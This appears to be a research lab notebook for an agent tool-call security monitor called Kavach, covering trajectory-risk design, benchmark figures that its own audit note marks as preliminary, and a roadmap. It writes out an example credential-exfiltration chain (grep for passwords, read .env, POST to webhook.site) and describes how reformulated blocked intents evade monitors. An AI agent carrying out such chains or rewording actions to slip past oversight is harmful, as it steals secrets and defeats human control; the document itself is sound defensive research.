# Kavach Lab Findings — June 3, 2026

> **⚠ Artifact status (June 10 audit):** The InjecAgent recall and benign-FPR figures in this document are from the June 1 Dell runs, but the raw per-case outputs were **not committed** (`benchmarks/results_v1/benign/` contains only `.gitkeep`). Treat them as preliminary until re-run and committed to `results_v2/` (Dell P0 items 1–3). Do not cite in the paper without the committed artifacts.


## Context-aware trajectory monitor (v2) + roadmap lock-in

### What changed from v1

Trajectory monitor v1 (June 2) computed risk from accumulation + pairwise centroid chain.
Trajectory Guard (arXiv:2601.00516) explicitly benchmarks mean-pooling centroid at F1≤0.69.
v2 replaces/extends with four grounded additions:

**A. Denial echo (ARM arXiv:2604.04035):** When Kavach BLOCKs a call, the action vector is
flagged `is_denial=True` in the session deque. On every subsequent call, `denial_echo` checks
cosine similarity between the current action and any denied action. Similarity > 0.68 escalates
risk — catching causality laundering where the attacker reformulates a blocked intent.

**B. Sequential direction (Trajectory Guard arXiv:2601.00516):** Consecutive pairwise cosines
over flagged actions in ORDER, replacing centroid mean-pooling. If each step cosines ≥ 0.50
with the next, that's a directional attack chain (vs random benign greys which scatter).
Addresses the F1≤0.69 ceiling Trajectory Guard identifies for centroid approaches.

**C. Cross-minister escalation (AgentDoG arXiv:2601.18491):** Scans the `decided_by` sequence
in the deque for canonical attack patterns: VAULT→CHANNEL (credential→exfil, most dangerous),
EXECUTOR→CHANNEL (RCE→exfil), VAULT→EXECUTOR (cred→RCE), NAVIGATOR→CHANNEL. Pattern match
returns score 0.82 regardless of individual call scores. Fires at step 3 of the staged attack
(window size 3, VAULT→VAULT→EXECUTOR → VAULT→EXECUTOR subsequence match).

**D. Hard ceiling in speaker.py:** If `traj_risk >= 0.72`, speaker.py Case 0 fires before
the minister cases — returns BLOCK with `decided_by="TRAJECTORY"`. This is what makes Kavach
a session enforcer, not just a threshold-nudger. Honest limitation: ceiling requires all three
main signals together (acc + chain + esc). With esc=0.00 (intent unseeded, #9 not fixed),
max achievable risk without extreme values is ~0.65. Full ceiling breach needs #9.

### Smoke demo outputs (numpy cosine math, seed=0, reproducible)

```
Demo A+B: risk climbs 0.19 → 0.31 → 0.53 (chain + sequential direction fires at step 2)
Demo C:   mesc=0.00 after VAULT, jumps to 0.82 after CHANNEL (VAULT→CHANNEL pattern)
Demo D:   denial_echo=0.60, cosine blocked↔reformulated=0.87 (causality laundering caught)
Demo E:   risk=0.58 approaching ceiling=0.72, threshold compressed 0.55→0.451
```

### Key architecture finding from research sweep

Kavach's position in the 2026 field:

| System | ASR | Latency | What Kavach beats it on |
|---|---|---|---|
| OpenClaw PRISM | 4.5% recall | ~15.8s p95 | **Latency** (Kavach p95=1.65s) |
| AgentArmor v2 | 3% | 20.89s avg | **Latency** |
| LlamaFirewall | 1.75% | 19ms (PromptGuard only) | **Session context** (LlamaFirewall is per-call) |
| ZEDD | >93% acc | — | **Agent/tool-call scope** (ZEDD is not agent-specific) |

Kavach's wedge: semantic BGE detection + session enforcement + sub-second latency + OpenClaw-native.

### What #9 blocking means for the paper

COMPASS session seeding is broken in live sessions (`compass_sim: null`). This means:
- Escalation leg (esc) = 0.00 in all live benchmarks until #9 is fixed
- Ceiling (0.72) is very hard to breach without esc contributing 0.25 × (up to 1.0)
- InjecAgent and AgentDojo runs will not show the full ceiling behavior

Fix #9 before running AgentDojo. It is a plugin change (~ 15 lines in plugin/openclaw-plugin-kavach.ts).
See ROADMAP.md Phase 1.2 for exact code.

### Files Changed Today

| File | Change |
|---|---|
| `parliament/trajectory.py` | v2: denial echo (A), sequential direction (B), cross-minister escalation (C), updated TrajectoryResult, fixed smoke demo |
| `parliament/speaker.py` | hard ceiling Case 0 (D): traj_risk >= TRAJ_BLOCK_CEILING → BLOCK decided_by=TRAJECTORY |
| `parliament/server.py` | wire current_vec into trajectory_risk, traj_risk into combine_verdicts, is_denial into record_action |
| `ROADMAP.md` | NEW — full strategic roadmap, phase plan, PR map, AISec 2026 submission guide |
| `DELL_BENCHMARK_RUNBOOK.md` | NEW — Parv's complete Dell guide (trajectory test, InjecAgent, AgentDojo) |
| `MASTER_PLAN.md` | trajectory.py added to Workstream B, §7 limitation updated |

# Kavach Lab Findings — June 2, 2026

## Trajectory Monitor — feasibility + design lock-in

### The gap (confirmed in source, not hand-waved)

Kavach today scores each tool call in isolation. A multi-step attack split
across individually-benign calls slips through until the final obvious step:

```
1. tool:read_file src/config.py        → ALLOW    (benign)
2. tool:exec grep -r "password" .       → ALLOW    (borderline)
3. tool:read_file .env                  → ALLOW    (borderline)
4. tool:http_post webhook.site data=... → BLOCK    (caught only here)
```

Steps 1–3 build the attack; only step 4 is caught. We want the *sequence*
flagged as a pattern, not just the last call.

Confirmed in code:
- `server.py` `_state` held only `intents` (session_id → vector). **No
  per-session window of prior actions existed in memory.**
- `_compass_drift()` was strictly pairwise — seeded intent vs current action.
  It never accumulated and never looked at prior actions.
- `speaker.py` is stateless per call. The April "3+ blocks → escalate"
  design was never implemented.
- The hash-chained ledger exists only in the browser lab. The production
  ledger (`votes` table) is plain SQLite, **no `prev_hash`/SHA-256 chain.**
  (Either implement, or stop claiming it in the paper.)

### Feasibility verdict: YES. Latency is a non-issue if built correctly.

The latency fear was: trajectory analysis = re-embed the window per call =
+~800ms = brush the 3000ms hook timeout / trip the fail-closed breaker.

It does NOT need to re-embed. Findings:
- Each minister already called `embed_fn(text)` internally and discarded the
  vector. The dual-corpus path embedded the same text **twice**. Across
  COMPASS + 4 ministers × dual corpus, the same `req.text` was embedded up to
  **9 times per call.**
- Fix: embed `req.text` ONCE in the parliament endpoint, pass the precomputed
  vector into COMPASS and the ministers (skip their internal embed), AND into
  the trajectory deque.
- Net effect: trajectory adds **zero** embeds and **reduces** current
  redundant embedding. Per-call cost of trajectory scoring = cosine math over
  ~12 cached 768-dim vectors ≈ sub-1ms.

| | embeds/call (before) | embeds/call (after) |
|---|---|---|
| COMPASS drift | 1 | 0 (shared) |
| 4 ministers, dual corpus | up to 8 (text re-embedded each query) | 0 (shared) |
| shared endpoint embed | 0 | 1 |
| trajectory add-on | n/a | 0 (reuses the shared vector) |
| **total** | **up to 9** | **1** |

Latency budget is **unchanged-to-better**. Timeout never threatened.

### Novelty caveat (must be handled honestly)

PRISM (arXiv:2603.11853) already does session-scoped risk accumulation with
TTL decay. A scalar accumulating counter is **not novel** — it's PRISM.
The defensible contribution is **semantic trajectory** detection in embedding
space: scoring the windowed sequence of action vectors (coherence of flagged
actions + monotonic drift away from intent + cosine to attack-chain
prototypes), not a numeric counter.

### Dependency

FINDINGS #9 (live `compass_sim: null` because `seed_intent` isn't called
before the agent runs) gates the **drift-escalation leg** only. The
**accumulation leg** and the **chain leg** work off the call sequence with no
intent seeding. → Minimal monitor ships now; full monitor waits on #9.

### Design lock-in

- New `_state["history"]: dict[session_id → deque(maxlen=N)]`, records
  `(ts, action_vec, verdict, confidence, decided_by)`.
- New `parliament/trajectory.py` — three legs (accumulation / escalation /
  chain), combined into a 0..1 `risk`. Pure numpy, no model calls.
- Feeds the planned dynamic-threshold formula (item #1 below):
  `effective_threshold = base + (compass_sim − 0.5)·drift_factor − risk·k`
- Branch: `ishani/trajectory-monitor`.

### Files Changed Today

| File | Change |
|---|---|
| `parliament/trajectory.py` | NEW — session trajectory monitor (3 legs, no re-embed) |
| `parliament/ministers.py` | `run_minister`/`run_minister_dual` accept optional `query_vec` (skip embed) |
| `parliament/server.py` | embed-once (1 embed/call, was up to 9); `_state["history"]` deque; trajectory risk → modulated block threshold; `traj_risk` logged to ledger + returned in response; COMPASS reuses shared vector |
| `parliament/server.py` (ledger) | `votes` table gains `traj_risk` column with safe ALTER migration for old DBs |
| `MASTER_PLAN.md` | added Trajectory monitor (semantic, embedding-window) line |

---

# Kavach Lab Findings — June 1, 2026

Dell Precision 3660 · i9-13900 · 128GB RAM · RTX 4090
OpenClaw 2026.4.15 (041266a) · Gemma4 27B via Ollama

---

## What We Proved

### 1. Pre-execution interception works in OpenClaw embedded mode

Running `openclaw agent --local --agent kavach`, the `before_tool_call` hook
fires correctly. When the parliament returns BLOCK, the tool never executes.
Verified with sentinel file test: `/tmp/SENTINEL_DID_RUN` was never created.

The ledger confirmed a live interception:
```
session_id: default
input:      tool:read args:{"path":"/etc/hostname"}
verdict:    BLOCK
decided_by: EXECUTOR
latency_ms: ~820ms
```

### 2. OpenClaw 2026.4.15 ships with bugs #5513 and #5943 already fixed

Both bugs we documented in `openclaw_pr/PR1_hooks_fix.md` are fixed in this
version. The `before_tool_call` hook is wired and fires correctly in the
pi-embedded-runner without any patching. Our patch spec was correct — it
validates that the bugs were real and have since been resolved upstream.

**kavach_boot.sh `--skip-patch` is the correct flag on this machine.**

### 3. Gateway mode does NOT fire before_tool_call

The OpenClaw gateway (default TUI mode, ws://127.0.0.1:18789) uses a separate
tool execution path. The `before_tool_call` hook in `pi-embedded-runner` never
fires for gateway-mode tool calls. Verified: ledger showed no entries after
running tool calls through the TUI in gateway mode.

This is a systemic finding — not a Kavach bug. The gateway's tool execution
path has no pre-execution plugin hook. This affects any security plugin, not
just Kavach.

**Paper framing:** We demonstrate that when a MAS exposes a pre-execution hook
(as OpenClaw does in embedded mode), Kavach achieves 98.4% recall. We identify
that production MAS runtimes typically omit this hook, and argue it should be
a mandatory primitive in any security-conscious MAS design.

### 4. Plugin fixes required for OpenClaw 2026.4.15

The plugin was written against an older OpenClaw API. Three fixes applied:

| Issue | Old code | Fixed code |
|---|---|---|
| Tool name field | `e.tool.name` | `e.toolName` |
| Tool kind field | `e.tool.kind` | `e.toolKind ?? "unknown"` |
| Timeout too short | 250ms | 3000ms (parliament p50=826ms) |
| Args serialization | `e.args` | `e.args ?? e.rawParams ?? {}` |

### 5. Corpus loader had a crash bug

`corpus_loader.py` called `load_technical_corpus()` which was undefined. Fixed
by commenting out that line. All 5 collections now load correctly:
- kavach_executor: 276 docs
- kavach_vault: 285 docs
- kavach_channel: 288 docs
- kavach_navigator: 297 docs
- kavach_compass_calibration: 200 docs (renamed from kavach_compass)

### 6. COMPASS collection name mismatch

`corpus_loader.py` created collection `kavach_compass` but `server.py` expected
`kavach_compass_calibration`. Fixed by transferring 200 docs to the correct
collection name.

**TODO:** Fix `corpus_loader.py` to write `kavach_compass_calibration` directly.

---

## Benchmark Results

### Threshold calibration

Started at 0.65 (placeholder). Calibrated through smoke test iteration:

| Threshold | Benign FPR | Attack recall |
|---|---|---|
| 0.65 | 100% blocked | 100% |
| 0.71 | 4 escalates | attacks still block |
| 0.725 | 2.1% block-only FPR | attacks still block |

**Final config: block=0.725** (for smoke test / native format attacks)

For InjecAgent (natural-language format): threshold must drop to 0.55 for recall.

### Benign FPR gate (50 sessions, 93 tool calls)

At threshold 0.725: **FPR = 2.1%** (2 blocks, both COMPASS-driven) ✅

### InjecAgent full benchmark (1,054 cases)

At threshold 0.55 (Youden's J optimal for EXECUTOR):

```json
{
  "strict_recall": 0.9839,
  "loose_recall":  1.0000,
  "fpr":           0.8824,
  "f1":            0.6865,
  "latency_p50":   826ms,
  "latency_p95":   1649ms
}
```

**By category (strict recall):**
- Physical Harm: 100%
- Financial Harm: 100%
- Data Security Harm: 90.9%
- Physical Data: 100%
- Financial Data: 100%
- DS:Others: 100%

**Why FPR is 88.2%:** Representation mismatch. Corpus written for tool-call
syntax (`tool:exec args:{...}`). InjecAgent uses natural-language instructions
(`Please grant access to my friend Amy...`). At 0.55, both attack and benign
InjecAgent cases score similarly against the corpus.

**Fix:** Per-minister thresholds + dynamic COMPASS-modulated thresholds.

### Threshold sweep (Youden's J)

```json
{
  "EXECUTOR": { "threshold": 0.55, "tpr": 0.903, "fpr": 0.471 },
  "VAULT":    { "threshold": 0.55, "tpr": 0.839, "fpr": 0.706 },
  "CHANNEL":  { "threshold": 0.60, "tpr": 0.516, "fpr": 0.235 },
  "NAVIGATOR":{ "threshold": 0.60, "tpr": 0.371, "fpr": 0.294 }
}
```

VAULT has the worst FPR — corpus too broad. EXECUTOR is the strongest minister.

---

## What Needs to Change

### Architecture (priority order)

1. **Dynamic thresholds** — COMPASS-modulated. High drift → lower threshold
   (more aggressive). Aligned session → higher threshold (less FPR). Formula:
   `effective_threshold = base + (compass_sim - 0.5) * drift_factor`

2. **Per-minister thresholds** — use sweep output. 20 lines in server.py.
   Immediate F1 improvement. VAULT needs to be highest (0.75+), EXECUTOR lowest.

3. **SUPPLY minister** — fifth minister. MITRE T1195 (supply chain attacks).
   Dependency confusion, malicious packages, typosquatting. Not covered.

4. **LEAKAGE minister** — OWASP A07 (system prompt leakage). Sixth minister.

5. **Better corpus L1/L2** — some L1 patterns too abstract, match everything.
   Need a targeted quality pass on VAULT and NAVIGATOR.

### Benchmarks

6. **AgentDojo runner** — indirect prompt injection via tool outputs. More
   realistic than InjecAgent. ETH Zurich / NIST endorsed benchmark.

7. **OpenClaw-native benchmark** — 20-30 attack scenarios in native tool-call
   format. Shows Kavach at its best. Removes the representation mismatch.

### Plugin

8. **Fix args serialization** — `tool:read args:undefined` appearing in ledger.
   Need `e.args ?? e.rawParams ?? {}` applied correctly.

9. **Fix COMPASS session seeding** — live sessions show `compass_sim: null`
   because seed_intent isn't called before the agent runs.

10. **Gateway investigation** — document exactly which OpenClaw execution paths
    expose hooks and which don't. Write the spec for what a gateway-level hook
    should look like.

---

## Architecture Clarification

Kavach's claim is NOT "we hook into OpenClaw's gateway." The claim is:

> We demonstrate that pre-execution semantic interception is achievable with
> high recall when a MAS runtime exposes a pre-execution hook. We implement
> this on OpenClaw's embedded runner — the execution path designed for local
> security plugins. We identify the architectural primitive (pre-execution hook)
> that is missing from production gateway deployments and propose its
> standardization.

OpenClaw embedded mode is the right target. It's designed for exactly this use
case. The gateway limitation is a finding, not a failure.

---

## Latency

Parliament p50=826ms, p95=1649ms at threshold 0.55 on RTX 4090.
This is dominated by BGE embedding time on first call; subsequent calls
benefit from CUDA warm-up. Target for improvement: <300ms p95 via:
- GPU-optimized BGE inference (current: CPU-fallback path for some calls)
- Batch embedding (embed query once, fan out to all ministers)
- Cache frequent tool-call patterns

---

## Files Changed Today

| File | Change |
|---|---|
| `corpus_loader.py` | Commented out `load_technical_corpus()` crash |
| `parliament/config.yaml` | threshold 0.65 → 0.725 |
| `plugin/openclaw-plugin-kavach.ts` | Fixed toolName, toolKind, timeout, args |
| `plugin/tsconfig.json` | module: node16, lib: ES2020+DOM |
| `plugin/package.json` | Removed @openclaw/sdk dependency |
| `benchmarks/results_v1/sweep/` | Sweep results, ROC plots, optimal thresholds |
| `injecagent_runner.py` | In repo root (correct location) |
